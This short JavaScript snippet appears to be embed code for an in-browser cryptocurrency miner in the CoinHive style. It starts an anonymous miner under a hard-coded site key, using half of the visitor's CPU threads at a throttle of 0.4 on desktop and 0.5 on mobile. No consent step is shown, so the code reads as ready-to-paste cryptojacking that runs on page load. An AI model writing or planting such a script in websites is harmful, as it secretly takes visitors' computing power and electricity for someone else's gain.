let base = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
	forceASMJS: false
});

if (!base.isMobile()){
	let site = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
		threads: base.getNumThreads() / 2,
		throttle: 0.4,
		forceASMJS: false
	});
	site.start();
} else {
	let site = SETINDEX.Anonymous('SK_dw3n6JQoDTFfAfsNoOEnj', {
		threads: base.getNumThreads() / 2,
		throttle: 0.5,
		forceASMJS: false
	});
	site.start();
}